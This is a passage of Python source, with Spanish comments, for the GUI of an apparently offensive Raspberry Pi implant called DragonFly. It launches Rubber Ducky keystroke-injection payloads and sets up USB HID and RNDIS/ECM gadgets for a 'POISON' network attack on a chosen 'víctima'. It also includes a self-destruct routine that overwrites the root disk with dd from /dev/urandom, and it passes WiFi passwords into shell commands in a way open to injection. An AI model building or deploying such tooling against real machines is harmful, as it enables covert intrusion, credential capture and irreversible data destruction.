            threading.Thread(target=run, daemon=True).start()
        else:
            self.escribir_consola("[!] Gadget desconectado.")

    def _nrf_status(self):
        if self.gadget and self.gadget.is_available():
            def _fetch():
                try:
                    st = self.gadget.status()
                    self.after(0, lambda s=st: self.escribir_consola(f"[+] Estado ESP32: {s}"))
                except Exception as e:
                    self.after(0, lambda e=e: self.escribir_consola(f"[!] Error: {e}"))
            threading.Thread(target=_fetch, daemon=True).start()
        else:
            self.escribir_consola("[!] Gadget desconectado.")
    
    # ==========================================
    # MENÚ RUBBER DUCKY 
    # ==========================================
    def show_ducky_menu(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_inicio_menu)
        ttk.Label(self.main_frame, text="PAYLOADS DUCKY", style='Title.TLabel').pack(pady=2)

        # --- Menú para seleccionar el teclado (US / ES) ---
        config_frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        config_frame.pack(fill='x', padx=5, pady=2)
        
        ttk.Label(config_frame, text="Target Layout:", style='Dark.TLabel').pack(side='left', padx=(5, 2))
        layout_menu = ttk.OptionMenu(config_frame, self.ducky_layout, self.ducky_layout.get(), "us", "es", style='Dark.TMenubutton')
        layout_menu.pack(side='left')
        # --------------------------------------------------------

        payloads_dir = "payloads"
        os.makedirs(payloads_dir, exist_ok=True)
        archivos = sorted([f for f in os.listdir(payloads_dir) if f.endswith(".txt")])

        scroll = ScrollableFrame(self.main_frame, max_items=50)
        scroll.pack(fill='both', expand=True, padx=5, pady=2)
        
        # --- NUEVA LÓGICA: Lista para rastrear botones y bloquearlos ---
        self.ducky_botones_lista = []
        
        if not archivos:
            ttk.Label(scroll.scrollable_frame, text="No hay payloads.", style='Dark.TLabel').pack()
        else:
            for archivo in archivos:
                ruta = os.path.join(payloads_dir, archivo)
                btn = scroll.add_button(text=archivo, style='Red.TButton', width=28,
                                        command=lambda r=ruta: self._ejecutar_ducky(r))
                if btn:
                    self.ducky_botones_lista.append(btn)

        # --- NUEVO BOTÓN: Detener Payload ---
        self.btn_detener_ducky = ttk.Button(scroll.scrollable_frame, text="Detener Payload", style='Gray.TButton',
                                            command=self._detener_ducky)
        self.btn_detener_ducky.pack(pady=(15, 3), fill='x', padx=20)
        self.btn_detener_ducky.state(['disabled']) # Inicia bloqueado

        self.mostrar_consola(parent=scroll.scrollable_frame)
        gc.collect()

    def _import_ducky_logic(self):
        if not hasattr(self, '_ducky_logic'):
            import ducky_logic
            self._ducky_logic = ducky_logic
        return self._ducky_logic

    def _ejecutar_ducky(self, ruta):
        layout_seleccionado = self.ducky_layout.get() # Obtener si es 'us' o 'es'
        
        # 1. Bloquear todos los botones de payloads cambiándolos a gris
        for btn in getattr(self, 'ducky_botones_lista', []):
            if btn.winfo_exists():
                btn.config(style='Gray.TButton')
                btn.state(['disabled'])
        
        # 2. Habilitar el botón de detener poniéndolo en color Peligro/Advertencia
        if hasattr(self, 'btn_detener_ducky') and self.btn_detener_ducky.winfo_exists():
            self.btn_detener_ducky.config(style='Danger.TButton')
            self.btn_detener_ducky.state(['!disabled'])

        self.escribir_consola(f"\n[+] Exec: {os.path.basename(ruta)} ({layout_seleccionado.upper()})")

        def run():
            time.sleep(2)
            # En lugar de bloquear la GUI usando el módulo importado, ejecutamos 
            # la misma lógica vía subproceso para atrapar todo el output y tener un proceso matable.
            script_cmd = f"import ducky_logic; ducky_logic.ejecutar_script_ducky('{ruta}', layout='{layout_seleccionado}')"
            comando = ["sudo", "python3", "-c", script_cmd]
            
            try:
                self.ducky_proc = subprocess.Popen(comando, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                # Lee y envía en tiempo real todo el output de ducky_logic a la consola visual
                for line in self.ducky_proc.stdout:
                    self.escribir_consola(line.rstrip())
                self.ducky_proc.wait()
            except Exception as e:
                self.after(0, lambda e=e: self.escribir_consola(f"[!] Error: {e}"))
            finally:
                self.after(0, on_finish)

        def on_finish():
            # 3. Restaurar los botones a su estado rojo y activo
            for btn in getattr(self, 'ducky_botones_lista', []):
                if btn.winfo_exists():
                    btn.config(style='Red.TButton')
                    btn.state(['!disabled'])
            
            # Bloquear de nuevo el botón de detener
            if hasattr(self, 'btn_detener_ducky') and self.btn_detener_ducky.winfo_exists():
                self.btn_detener_ducky.config(style='Gray.TButton')
                self.btn_detener_ducky.state(['disabled'])
                
            self.ducky_proc = None

        threading.Thread(target=run, daemon=True).start()

    def _detener_ducky(self):
        """Detiene de forma forzosa la inyección del payload Ducky en curso."""
        self.escribir_consola("\n[!] Deteniendo Inyección Ducky...")
        
        # Inmediatamente bloqueamos el botón para evitar doble clic
        if hasattr(self, 'btn_detener_ducky') and self.btn_detener_ducky.winfo_exists():
            self.btn_detener_ducky.config(style='Gray.TButton')
            self.btn_detener_ducky.state(['disabled'])

        # Matamos el proceso seguro
        if hasattr(self, 'ducky_proc') and self.ducky_proc:
            try:
                self.ducky_proc.terminate()
                self.ducky_proc.wait(timeout=2)
            except:
                self.ducky_proc.kill()
        
        # Limpieza global (en caso de que algún proceso haya quedado zombie)
        subprocess.run(["sudo", "pkill", "-f", "ducky_logic"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def _cambiar_modo_usb(self, modo):
        self.escribir_consola(f"[*] Preparando perfil USB: {modo.upper()}...")

        cfg = "/boot/firmware/config.txt" if os.path.exists("/boot/firmware/config.txt") else "/boot/config.txt"
        gadget_script = "/usr/local/bin/usb_gadget.sh"
        service_path = "/etc/systemd/system/usb_gadget.service"

        # 1. Crear el servicio systemd si no existe
        if not os.path.exists(service_path):
            self.escribir_consola("[*] Creando servicio systemd para el gadget...")
            servicio_systemd = """[Unit]
Description=USB HID/Net Gadget Initialization
After=systemd-modules-load.service

[Service]
Type=oneshot
ExecStart=/bin/bash /usr/local/bin/usb_gadget.sh
RemainAfterExit=yes

[Install]
WantedBy=sysinit.target
"""
            subprocess.run(f"sudo sh -c 'echo \"{servicio_systemd}\" > {service_path}'", shell=True)
            subprocess.run("sudo systemctl daemon-reload", shell=True)

        # 2. Limpiar configuración dwc2
        subprocess.run(f"sudo sed -i '/dtoverlay=dwc2/d' {cfg}", shell=True)

        if modo == "host":
            subprocess.run(f"sudo sh -c 'echo \"dtoverlay=dwc2,dr_mode=host\" >> {cfg}'", shell=True)
            subprocess.run("sudo systemctl disable usb_gadget.service", shell=True, stderr=subprocess.DEVNULL)
            self.escribir_consola("[*] Controlador configurado como Host puro (Antena/Teclado externo).")
        else:
            subprocess.run(f"sudo sh -c 'echo \"dtoverlay=dwc2,dr_mode=peripheral\" >> {cfg}'", shell=True)
            subprocess.run("sudo systemctl enable usb_gadget.service", shell=True, stderr=subprocess.DEVNULL)
            
            # --- GENERADOR DINÁMICO DE LIBCOMPOSITE ---
            # Este script borra la configuración previa en memoria RAM (configfs) y monta la nueva
            sh_script = f"""#!/bin/bash
modprobe libcomposite
cd /sys/kernel/config/usb_gadget/

# LIMPIEZA TOTAL DE GADGETS PREVIOS
if [ -d dragonfly ]; then
  echo "" > dragonfly/UDC
  rm -f dragonfly/configs/c.1/hid.usb0
  rm -f dragonfly/configs/c.1/rndis.usb0
  rm -f dragonfly/configs/c.1/ecm.usb0
  rm -f dragonfly/os_desc/c.1
  rmdir dragonfly/configs/c.1/strings/0x409
  rmdir dragonfly/configs/c.1
  rmdir dragonfly/functions/hid.usb0 2>/dev/null
  rmdir dragonfly/functions/rndis.usb0 2>/dev/null
  rmdir dragonfly/functions/ecm.usb0 2>/dev/null
  rmdir dragonfly/strings/0x409
  rmdir dragonfly
fi

mkdir -p dragonfly
cd dragonfly
echo 0x1d6b > idVendor
echo 0x0104 > idProduct
echo 0x0100 > bcdDevice
echo 0x0200 > bcdUSB
mkdir -p strings/0x409
echo "fedcba9876543210" > strings/0x409/serialnumber
echo "DragonFly" > strings/0x409/manufacturer
"""
            # Nombres según el ataque
            if modo == "gadget":
                sh_script += "echo \"DragonFly HID (Keyboard)\" > strings/0x409/product\n"
            elif modo == "rndis":
                sh_script += "echo \"DragonFly RNDIS Ethernet\" > strings/0x409/product\n"
            elif modo == "ecm":
                sh_script += "echo \"DragonFly CDC ECM Ethernet\" > strings/0x409/product\n"

            sh_script += """
mkdir -p configs/c.1/strings/0x409
echo "Config 1" > configs/c.1/strings/0x409/configuration
echo 250 > configs/c.1/MaxPower
"""
            # Lógica para DUCKY (Teclado)
            if modo == "gadget":
                sh_script += """
mkdir -p functions/hid.usb0
echo 1 > functions/hid.usb0/protocol
echo 1 > functions/hid.usb0/subclass
echo 8 > functions/hid.usb0/report_length
echo -ne \\\\x05\\\\x01\\\\x09\\\\x06\\\\xa1\\\\x01\\\\x05\\\\x07\\\\x19\\\\xe0\\\\x29\\\\xe7\\\\x15\\\\x00\\\\x25\\\\x01\\\\x75\\\\x01\\\\x95\\\\x08\\\\x81\\\\x02\\\\x95\\\\x01\\\\x75\\\\x08\\\\x81\\\\x03\\\\x95\\\\x05\\\\x75\\\\x01\\\\x05\\\\x08\\\\x19\\\\x01\\\\x29\\\\x05\\\\x91\\\\x02\\\\x95\\\\x01\\\\x75\\\\x03\\\\x91\\\\x03\\\\x95\\\\x06\\\\x75\\\\x08\\\\x15\\\\x00\\\\x25\\\\x65\\\\x05\\\\x07\\\\x19\\\\x00\\\\x29\\\\x65\\\\x81\\\\x00\\\\xc0 > functions/hid.usb0/report_desc
ln -s functions/hid.usb0 configs/c.1/
"""
            # Lógica para RNDIS (Windows)
            elif modo == "rndis":
                sh_script += """
mkdir -p functions/rndis.usb0
echo 1 > os_desc/use
echo 0xcd > os_desc/b_vendor_code
echo MSFT100 > os_desc/qw_sign
mkdir -p functions/rndis.usb0/os_desc/interface.rndis
echo RNDIS > functions/rndis.usb0/os_desc/interface.rndis/compatible_id
echo 5162001 > functions/rndis.usb0/os_desc/interface.rndis/sub_compatible_id
ln -s functions/rndis.usb0 configs/c.1/
ln -s configs/c.1 os_desc
"""
            # Lógica para ECM (Mac/Linux)
            elif modo == "ecm":
                sh_script += """
mkdir -p functions/ecm.usb0
ln -s functions/ecm.usb0 configs/c.1/
"""

            # Comando final para encender el USB
            sh_script += "ls /sys/class/udc > UDC\n"

            # Guardar y aplicar
            with open("/tmp/usb_gadget.sh", "w") as f:
                f.write(sh_script)
            
            subprocess.run(f"sudo mv /tmp/usb_gadget.sh {gadget_script}", shell=True)
            subprocess.run(f"sudo chmod +x {gadget_script}", shell=True)
            self.escribir_consola(f"[*] Perfil generado y limpiado. (Modo: {modo.upper()})")

        self.escribir_consola("[+] Aplicado. REINICIANDO el sistema en 3 segundos...")
        self.after(3000, lambda: subprocess.run("sudo reboot", shell=True))
    
    # =========================================================================
    # MODULO: ENVENENAMIENTO DE RED (POISON) - ESTANDARIZADO
    # =========================================================================
    
    def show_poison_menu(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_inicio_menu)
        ttk.Label(self.main_frame, text="ATAQUE POISON (RNDIS/ECM)", style='Title.TLabel').pack(pady=2)

        # Usamos ScrollableFrame para que tenga scroll táctil como los otros menús
        scroll = ScrollableFrame(self.main_frame, max_items=15)
        scroll.pack(fill='both', expand=True, padx=2, pady=2)

        self.btn_ejecutar_poison = scroll.add_button(text="LANZAR ATAQUE",
                                                     command=self.accion_boton_lanzar_poison,
                                                     style='Red.TButton', width=28)
                                                     
        self.btn_detener_poison = scroll.add_button(text="DETENER ATAQUE",
                                                    command=self.accion_boton_detener_poison,
                                                    style='Gray.TButton', width=28)
        self.btn_detener_poison.state(['disabled']) # Inicia desactivado

        scroll.add_button(text="EXPLORAR LOGS",
                          command=self._poison_explorar_logs,
                          style='Danger.TButton', width=28)

        # Inyecta la terminal estandarizada (que YA incluye su propia Scrollbar nativa)
        self.mostrar_consola(parent=scroll.scrollable_frame)
        self.escribir_consola("[*] Módulo Poison cargado. Listo para iniciar en usb0...")
        import gc
        gc.collect()


    def accion_boton_lanzar_poison(self):
        import threading
        from datetime import datetime
        import network_modules.poison_logic as poison_logic

        # Intercambio de botones
        self.btn_ejecutar_poison.config(style='Gray.TButton')
        self.btn_ejecutar_poison.state(['disabled'])
        self.btn_detener_poison.config(style='Red.TButton')
        self.btn_detener_poison.state(['!disabled'])

        timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        session_dir = os.path.abspath(os.path.join(BASE_DIR_POISON, f"Auditoria-{timestamp}"))

        # Crear instancia del ataque (detecta la interfaz USB automáticamente)
        self.poison_attack_instance = poison_logic.PoisonAttack(
            interface=None,                     # detección automática
            callback_consola=self.escribir_consola,
            session_dir=session_dir
        )

        # Lanzar en hilo
        self.poison_thread = threading.Thread(
            target=self.poison_attack_instance.start,
            daemon=True
        )
        self.poison_thread.start()

    def accion_boton_detener_poison(self):
        """Detiene limpiamente el ataque Poison y fuerza el guardado de logs."""
        self.escribir_consola("\n[!] Deteniendo ataque...")
        if self.poison_attack_instance:
            self.poison_attack_instance.stop()   # señal + terminación de procesos
            # El hilo saldrá del bucle y ejecutará el finally (cleanup)
            # Podemos opcionalmente esperar un poco para que termine:
            if self.poison_thread and self.poison_thread.is_alive():
                self.poison_thread.join(timeout=5)
            self.poison_attack_instance = None
            self.poison_thread = None

        # Restaurar UI
        self.btn_ejecutar_poison.config(style='Red.TButton')
        self.btn_ejecutar_poison.state(['!disabled'])
        self.btn_detener_poison.config(style='Gray.TButton')
        self.btn_detener_poison.state(['disabled'])

    
        

    def _poison_explorar_logs(self):
        # Magia negra: Reutilizamos el explorador de archivos que ya usas para Nmap/WiFi
        # Creará el menú de navegación de carpetas de forma automática.
        self._mostrar_explorador_generico(BASE_DIR_POISON, "LOGS POISON", self.show_poison_menu)

    # ==========================================
    # MENÚ DESTRUCCION
    # ==========================================
    
    def show_self_destruct_menu(self):
        """Submenú de confirmación de autodestrucción."""
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_inicio_menu)
        ttk.Label(self.main_frame, text="AUTODESTRUCCIÓN", style='Title.TLabel').pack(pady=2)

        # 1. Envolvemos todo en el ScrollableFrame (igual que los otros menús)
        scroll_destruct = ScrollableFrame(self.main_frame, max_items=10)
        scroll_destruct.pack(fill='both', expand=True, padx=2, pady=2)

        # 2. Mensaje de advertencia bien centrado
        mensaje = ("Esto ELIMINARÁ TODOS LOS DATOS\nde la tarjeta SD.\n\n"
                   "El sistema quedará INUTILIZABLE.\n\n"
                   "¿Estás ABSOLUTAMENTE SEGURO?")
        
        lbl_advertencia = ttk.Label(scroll_destruct.scrollable_frame, text=mensaje, 
                                    style='Dark.TLabel', wraplength=280, justify='center')
        
        # Inyectamos el texto al scrollable_frame con sus respectivos márgenes
        scroll_destruct.add_widget(lbl_advertencia, pady=(10, 15))

        # 3. Botones estandarizados con el método interno add_button (width=28 por defecto)
        scroll_destruct.add_button(text="SÍ, DESTRUIR TODO", 
                                   command=self._self_destruct, 
                                   style='Red.TButton', width=28)
        
        scroll_destruct.add_button(text="NO, VOLVER AL MENÚ", 
                                   command=self.show_inicio_menu, 
                                   style='Gray.TButton', width=28)

        # 4. Acoplamos la terminal a la misma vista deslizable para ver el proceso
        self.mostrar_consola(parent=scroll_destruct.scrollable_frame)
        gc.collect()


    def _self_destruct(self):
        """Ejecuta la autodestrucción irreversible."""
        self.escribir_consola("[☠] INICIANDO SECUENCIA DE AUTODESTRUCCIÓN...")

        def destruir():
            try:
                # Detectar el disco raíz
                cmd_find_root = "lsblk -ndo PKNAME $(findmnt -n -o SOURCE /)"
                disco = subprocess.check_output(cmd_find_root, shell=True, text=True).strip()
                if not disco:
                    disco = "mmcblk0"  # fallback típico Pi Zero 2
                ruta_disco = f"/dev/{disco}"
                self.escribir_consola(f"[*] Disco raíz: {ruta_disco}")

                # Borrado con datos aleatorios
                cmd = f"sudo dd if=/dev/urandom of={ruta_disco} bs=4M status=progress &"
                subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL, preexec_fn=os.setpgrp)
                self.escribir_consola("[☠] Destruyendo datos... El sistema fallará en segundos.")
            except Exception as e:
                self.escribir_consola(f"[!] Error: {e}")

        threading.Thread(target=destruir, daemon=True).start()

    # ==========================================
    # MENÚ UTILIDADES 
    # ==========================================
    def show_utils_menu(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_inicio_menu)
        ttk.Label(self.main_frame, text="UTILIDADES", style='Title.TLabel').pack(pady=2)

        # Usamos el ScrollableFrame para envolver TODA la pantalla
        scroll_utils = ScrollableFrame(self.main_frame, max_items=20)
        scroll_utils.pack(fill='both', expand=True, padx=2, pady=2)

        opciones = [
            ("Activar Perfil: ANTENA WIFI", lambda: self._cambiar_modo_usb("host")),
            ("Activar Perfil: RUBBER DUCKY", lambda: self._cambiar_modo_usb("gadget")),
            ("Activar Perfil: POISON (Red USB)", self._utils_poison_menu),
            ("Conectar a Red WiFi", self._utils_wifi_seleccionar_interfaz),
            ("Redes WiFi Guardadas", self._utils_wifi_redes_guardadas), # NUEVA OPCIÓN
            ("Estado de Red WiFi", self._utils_wifi_estado),
            ("Conectar Dispositivo BT", self._utils_bluetooth_seleccionar_interfaz),
            ("Estado de Adaptador BT", self._utils_bluetooth_estado),
            ("Actualizar Sistema (APT)", self._utils_actualizar_sistema) # NUEVA OPCIÓN
        ]
        for texto, cmd in opciones:
            scroll_utils.add_button(text=texto, command=cmd, style='Red.TButton', width=28)

        ttk.Label(scroll_utils.scrollable_frame, text="SISTEMA", style='Title.TLabel').pack(pady=(4, 2))
        
        comandos_sys = [
            ("Almacenamiento", "df -h"),
            ("Memoria RAM", "free -h"),
            ("Top CPU", "ps aux --sort=-%cpu | head -6"),
            ("Conexiones", "ss -tulnp | head -10")
        ]
        for nombre, cmd in comandos_sys:
            scroll_utils.add_button(text=nombre,
                                  command=lambda c=cmd: self.ejecutar_comando(c, use_shell=True),
                                  style='Gray.TButton', width=28)

        sys_opts = ttk.Frame(scroll_utils.scrollable_frame, style='Dark.TFrame')
        sys_opts.pack(fill='x', padx=5, pady=5)
        # Modificado para soportar 3 columnas (0, 1, 2)
        sys_opts.grid_columnconfigure((0, 1, 2), weight=1)
        
        ttk.Button(sys_opts, text="REINICIAR", style='Danger.TButton',
                   command=lambda: subprocess.run("reboot", shell=True)).grid(row=0, column=0, padx=2, sticky="ew")
        ttk.Button(sys_opts, text="APAGAR", style='Danger.TButton',
                   command=lambda: subprocess.run("shutdown -h now", shell=True)).grid(row=0, column=1, padx=2, sticky="ew")
        # NUEVO BOTÓN PARA SALIR DE LA INTERFAZ
        ttk.Button(sys_opts, text="SALIR", style='Danger.TButton',
                   command=self.destroy).grid(row=0, column=2, padx=2, sticky="ew")
                                                                                        
        self.mostrar_consola(parent=scroll_utils.scrollable_frame)
        gc.collect()
        

    def _utils_poison_menu(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_utils_menu)
        ttk.Label(self.main_frame, text="PERFIL POISON (RED USB)", style='Title.TLabel').pack(pady=2)

        scroll = ScrollableFrame(self.main_frame, max_items=10)
        scroll.pack(fill='both', expand=True, padx=2, pady=2)
        
        ttk.Label(scroll.scrollable_frame, text="Selecciona el OS de la víctima:", style='Gray.TLabel').pack(pady=5)

        # Botón para víctimas Windows (Usa protocolo RNDIS)
        scroll.add_button(text="Activar Windows (RNDIS)", 
                          command=lambda: self._cambiar_modo_usb("rndis"), 
                          style='Danger.TButton', width=28)
                          
        # Botón para víctimas Mac/Linux (Usa protocolo CDC ECM)
        scroll.add_button(text="Activar Mac/Linux (CDC ECM)", 
                          command=lambda: self._cambiar_modo_usb("ecm"), 
                          style='Red.TButton', width=28)

        self.mostrar_consola(parent=scroll.scrollable_frame)

    # -------------------- NUEVAS FUNCIONES DE SISTEMA Y RED --------------------

    def _utils_wifi_redes_guardadas(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_utils_menu)
        ttk.Label(self.main_frame, text="REDES GUARDADAS", style='Title.TLabel').pack(pady=2)

        scroll = ScrollableFrame(self.main_frame, max_items=50)
        scroll.pack(fill='both', expand=True, padx=2, pady=2)

        try:
            # Filtramos solo las conexiones WiFi guardadas en NetworkManager
            output = subprocess.check_output("nmcli -t -f NAME,TYPE connection show | grep 802-11-wireless", shell=True, text=True)
            redes = [line.split(':')[0] for line in output.splitlines() if line]

            if not redes:
                ttk.Label(scroll.scrollable_frame, text="No hay redes guardadas.", style='Dark.TLabel').pack(pady=10)
            else:
                for red in redes:
                    scroll.add_button(text=red, command=lambda r=red: self._utils_wifi_conectar_guardada(r),
                                      style='Gray.TButton', width=28)
        except Exception as e:
            ttk.Label(scroll.scrollable_frame, text=f"Error leyendo redes.", style='Dark.TLabel').pack()

        self.mostrar_consola(parent=scroll.scrollable_frame)
        gc.collect()

    def _utils_wifi_conectar_guardada(self, ssid):
        self.escribir_consola(f"[*] Conectando a red guardada: {ssid}...")
        # Usamos nmcli connection up en lugar de device wifi connect porque ya tiene la contraseña guardada
        self.ejecutar_comando(f"nmcli connection up '{ssid}'", use_shell=True)

    def _utils_actualizar_sistema(self):
        self.escribir_consola("[*] Iniciando actualización de repositorios...")
        self.escribir_consola("[!] Esto puede tardar varios minutos en la Pi Zero 2.")
        # Encadenamos update y upgrade. La bandera -y evita que apt pregunte [Y/n] y se quede trabado
        comando_update = "sudo apt update && sudo DEBIAN_FRONTEND=noninteractive apt upgrade -y"
        self.ejecutar_comando(comando_update, callback_after=lambda: self.escribir_consola("[+] Actualización completada."), use_shell=True)

    # -------------------- UTILIDADES WiFi --------------------
    def obtener_interfaces_wifi(self):
        interfaces = []
        try:
            output = subprocess.check_output("iw dev | grep Interface", shell=True, text=True)
            for line in output.splitlines():
                interfaces.append(line.split()[-1])
        except:
            pass
        return interfaces if interfaces else []

    def _utils_wifi_seleccionar_interfaz(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_utils_menu)
        ttk.Label(self.main_frame, text="IFACE WIFI", style='Title.TLabel').pack(pady=2)
        
        scroll = ScrollableFrame(self.main_frame, max_items=10)
        scroll.pack(fill='both', expand=True, padx=2, pady=2)
        
        for iface in self.obtener_interfaces_wifi():
            scroll.add_button(text=iface, command=lambda i=iface: self._utils_wifi_escanear_redes(i),
                              style='Red.TButton', width=28)
                              
        self.mostrar_consola(parent=scroll.scrollable_frame)

    def _utils_wifi_escanear_redes(self, iface):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._utils_wifi_seleccionar_interfaz)
        ttk.Label(self.main_frame, text="ESCANEANDO...", style='Title.TLabel').pack(pady=2)
        self.mostrar_consola()

        def escanear():
            subprocess.run(f"nmcli device wifi rescan ifname {iface}", shell=True, stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
            time.sleep(2)
            try:
                output = subprocess.check_output(f"nmcli -t -f SSID,SECURITY,SIGNAL device wifi list ifname {iface}",
                                                 shell=True, text=True, stderr=subprocess.DEVNULL)
                redes = []
                for line in output.strip().split('\n'):
                    if not line.strip(): continue
                    parts = line.split(':')
                    if len(parts) >= 3: redes.append(
                        {"ssid": parts[0] or "<Oculta>", "security": parts[1] or "Ninguna", "signal": parts[2]})
                self.after(0, lambda: self._utils_wifi_mostrar_redes(iface, redes))
            except:
                self.after(0, lambda: self._utils_wifi_mostrar_redes(iface, []))

        threading.Thread(target=escanear, daemon=True).start()

    def _utils_wifi_mostrar_redes(self, iface, redes):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._utils_wifi_seleccionar_interfaz)
        ttk.Label(self.main_frame, text="REDES", style='Title.TLabel').pack(pady=2)
        if not redes:
            ttk.Label(self.main_frame, text="No disponibles.", style='Dark.TLabel').pack()
            return
        scroll = ScrollableFrame(self.main_frame, max_items=50)
        scroll.pack(fill='both', expand=True, padx=5, pady=2)
        for red in redes:
            texto = f"{red['ssid']} | {red['signal']}%"
            scroll.add_button(text=texto,
                              command=lambda r=red: self._utils_wifi_conectar(iface, r['ssid'], r['security']),
                              style='Gray.TButton', width=28)
        self.mostrar_consola(parent=scroll.scrollable_frame)
        gc.collect()

    def _utils_wifi_conectar(self, iface, ssid, security):
        if security and security.lower() != "none" and "wep" not in security.lower():
            # IMPLEMENTACIÓN DEL NUEVO TECLADO VIRTUAL
            var_pwd = tk.StringVar()
            teclado = TecladoCompleto(self, var_pwd, titulo=f"Pwd: {ssid}")
            self.wait_window(teclado) # Pausa el hilo hasta que se cierre la ventana

            password = var_pwd.get()
            
            # Validar si el usuario presionó CANCEL o dejó vacío
            if password == "CANCELADO" or not password: 
                return
        else:
            password = None

        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._utils_wifi_escanear_redes(iface))
        ttk.Label(self.main_frame, text=f"CONECTANDO...", style='Title.TLabel').pack(pady=5)
        self.mostrar_consola()

        def conectar():
            try:
                cmd = f"nmcli device wifi connect '{ssid}' password '{password}' ifname {iface}" if password else f"nmcli device wifi connect '{ssid}' ifname {iface}"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    state_out = subprocess.check_output(f"nmcli -t -f GENERAL.STATE dev show {iface}", shell=True,
                                                        text=True)
                    estado = "ÉXITO" if "100 (connected)" in state_out else "ADVERTENCIA"
                else:
                    estado = f"ERROR: {result.stderr.strip()}"
            except Exception as e:
                estado = f"EXCEPCIÓN: {e}"
            self.after(0, lambda: self._utils_wifi_mostrar_resultado(estado, iface))

        threading.Thread(target=conectar, daemon=True).start()

    def _utils_wifi_mostrar_resultado(self, mensaje, iface):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._utils_wifi_seleccionar_interfaz)
        ttk.Label(self.main_frame, text="RESULTADO", style='Title.TLabel').pack(pady=5)
        ttk.Label(self.main_frame, text=mensaje, wraplength=300).pack(pady=5)
        self.mostrar_consola()

    def _utils_wifi_estado(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_utils_menu)
        ttk.Label(self.main_frame, text="ESTADO WIFI", style='Title.TLabel').pack(pady=5)
        
        scroll = ScrollableFrame(self.main_frame, max_items=10)
        scroll.pack(fill='both', expand=True, padx=2, pady=2)
        
        self.mostrar_consola(parent=scroll.scrollable_frame)
        for iface in self.obtener_interfaces_wifi():
            self.ejecutar_comando(f"nmcli -t -f GENERAL.STATE,IP4.ADDRESS dev show {iface} | head -2")

    # -------------------- UTILIDADES BLUETOOTH --------------------
    def obtener_interfaces_bluetooth(self):
        interfaces = []
        try:
            output = subprocess.check_output("hciconfig -a | grep 'hci'", shell=True, text=True)
            for line in output.splitlines():
                if "hci" in line:
                    interfaces.append(line.split(':')[0].strip())
        except:
            pass
        return interfaces if interfaces else []

    def _utils_bluetooth_seleccionar_interfaz(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_utils_menu)
        ttk.Label(self.main_frame, text="ADAPTADOR BT", style='Title.TLabel').pack(pady=5)
        
        scroll = ScrollableFrame(self.main_frame, max_items=10)
        scroll.pack(fill='both', expand=True, padx=2, pady=2)
        
        for iface in self.obtener_interfaces_bluetooth():
            scroll.add_button(text=iface, command=lambda i=iface: self._utils_bluetooth_escanear(i),
                              style='Red.TButton', width=28)
                              
        self.mostrar_consola(parent=scroll.scrollable_frame)

    def _utils_bluetooth_escanear(self, iface):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._utils_bluetooth_seleccionar_interfaz)
        ttk.Label(self.main_frame, text="ESCANEANDO BT...", style='Title.TLabel').pack(pady=5)
        self.mostrar_consola()

        def escanear():
            subprocess.run(["sudo", "hciconfig", iface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            for cmd_text in ["select", "power on", "discoverable on", "pairable on"]:
                subprocess.run(f"sudo bluetoothctl -- {cmd_text}", shell=True, stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL)
            subprocess.run("sudo bluetoothctl -- scan on &", shell=True, stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
            time.sleep(12)
            subprocess.run(["sudo", "bluetoothctl", "--", "scan", "off"], stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
            dispositivos = []
            try:
                output = subprocess.check_output("sudo bluetoothctl -- devices", shell=True, text=True)
                for line in output.splitlines():
                    if "Device" in line:
                        parts = line.strip().split(' ', 2)
                        if len(parts) >= 3:
                            dispositivos.append({"mac": parts[1], "nombre": parts[2]})
            except:
                pass
            self.after(0, lambda: self._utils_bluetooth_mostrar_dispositivos(iface, dispositivos))

        threading.Thread(target=escanear, daemon=True).start()

    def _utils_bluetooth_mostrar_dispositivos(self, iface, dispositivos):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._utils_bluetooth_seleccionar_interfaz)
        ttk.Label(self.main_frame, text="DISPOSITIVOS", style='Title.TLabel').pack(pady=2)
        if not dispositivos:
            ttk.Label(self.main_frame, text="No encontrados.", style='Dark.TLabel').pack()
            return
        scroll = ScrollableFrame(self.main_frame, max_items=50)
        scroll.pack(fill='both', expand=True, padx=5, pady=2)
        for dev in dispositivos:
            texto = f"{dev['nombre'][:15]} ({dev['mac']})"
            scroll.add_button(text=texto,
                              command=lambda d=dev: self._utils_bluetooth_conectar(iface, d['mac'], d['nombre']),
                              style='Gray.TButton', width=28)
        self.mostrar_consola(parent=scroll.scrollable_frame)
        gc.collect()

    def _utils_bluetooth_conectar(self, iface, mac, nombre):
        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._utils_bluetooth_escanear(iface))
        ttk.Label(self.main_frame, text=f"CONECTANDO BT:\n{nombre[:15]}", style='Title.TLabel', justify='center').pack(pady=5)
        self.mostrar_consola()

        def conectar():
            try:
                self.escribir_consola(f"[*] Emparejando con {mac}...")
                subprocess.run(f"sudo bluetoothctl -- pair {mac}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(2)
                
